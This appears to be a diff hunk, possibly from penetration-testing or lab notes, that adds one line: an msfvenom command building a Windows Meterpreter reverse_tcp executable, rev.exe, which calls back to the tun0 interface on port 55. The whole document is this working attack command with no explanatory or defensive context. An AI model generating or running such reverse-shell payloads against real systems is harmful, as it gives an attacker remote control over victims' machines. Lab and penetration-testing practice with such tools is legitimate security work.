@@ -1,0 +1,1 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=55 -f exe  > rev.exe
